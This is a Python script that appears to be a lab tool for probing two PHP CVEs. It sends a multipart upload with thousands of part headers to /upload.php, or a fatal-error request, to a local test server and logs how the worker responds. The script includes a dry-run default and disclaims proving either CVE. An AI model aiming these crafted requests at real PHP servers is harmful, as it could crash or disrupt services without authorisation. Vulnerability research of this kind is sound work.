#!/usr/bin/env python3
"""Bounded candidate probes for the two official PHP CVEs.

This records request/worker evidence; it does not claim that an HTTP error,
worker restart, or fatal error alone proves memory corruption or either CVE.
"""

import argparse
import http.client
import json
import time
from urllib.parse import urlsplit


BOUNDARY = "php-official-cve-lab"


def request(host, port, method, path, body=None, headers=None):
    started = time.time()
    connection = http.client.HTTPConnection(host, port, timeout=15)
    try:
        connection.request(method, path, body=body, headers=headers or {})
        response = connection.getresponse()
        data = response.read(2048)
        result = {
            "status": response.status,
            "worker_pid_header": response.getheader("X-Lab-Worker-Pid"),
            "body_prefix": data.decode("utf-8", "replace"),
        }
    except (OSError, http.client.HTTPException) as exc:
        result = {"transport_error": type(exc).__name__ + ": " + str(exc)}
    finally:
        connection.close()
    result["elapsed_ms"] = round((time.time() - started) * 1000)
    return result


def multipart_with_part_headers(count):
    chunks = [
        f"--{BOUNDARY}\r\n",
        'Content-Disposition: form-data; name="f"; filename="lab.txt"\r\n',
    ]
    chunks.extend(f"X-Lab-{number}: x\r\n" for number in range(count))
    chunks.append("Content-Type: text/plain\r\n\r\nx\r\n")
    chunks.append(f"--{BOUNDARY}--\r\n")
    return "".join(chunks).encode("ascii")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("mode", choices=("109618", "109619"))
    parser.add_argument("--base-url", default="http://127.0.0.1:8088")
    parser.add_argument("--part-headers", type=int, default=5000,
                        help="109618 candidate: multipart part header count, 1..50000")
    parser.add_argument("--run", action="store_true",
                        help="Actually send requests; default is a dry run")
    args = parser.parse_args()

    target = urlsplit(args.base_url)
    if target.scheme not in ("http", "https") or target.username or target.password or target.query or target.fragment:
        parser.error("--base-url must be a plain HTTP(S) URL")
    hostname = target.hostname
    if not hostname:
        parser.error("--base-url must include a hostname or IP")
    if target.path not in ("", "/"):
        parser.error("--base-url must not include an application path")
    if not 1 <= args.part_headers <= 50000:
        parser.error("--part-headers must be between 1 and 50000")
    port = target.port or (443 if target.scheme == "https" else 80)
    if not 1 <= port <= 65535:
        parser.error("port must be between 1 and 65535")

    report = {
        "mode": args.mode,
        "target": f"{target.scheme}://{hostname}:{port}",
        "scope": "candidate input and worker observation only; not CVE proof",
        "requests": [],
    }
    if args.mode == "109618":
        body = multipart_with_part_headers(args.part_headers)
        report["multipart_part_headers"] = args.part_headers
        report["body_bytes"] = len(body)
        if args.run:
            report["requests"].append({"baseline": request(hostname, port, "GET", "/health.php")})
            report["requests"].append({"candidate": request(
                hostname, port, "POST", "/upload.php", body,
                {"Content-Type": f"multipart/form-data; boundary={BOUNDARY}"},
            )})
            report["requests"].append({"after": request(hostname, port, "GET", "/health.php")})
    else:
        if args.run:
            report["requests"].append({"baseline": request(hostname, port, "GET", "/health.php")})
            report["requests"].append({"fatal_producer": request(hostname, port, "GET", "/fatal.php")})
            report["requests"].append({"early_consumer": request(hostname, port, "GET", "/health.php")})
    report["sent"] = args.run
    print(json.dumps(report, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
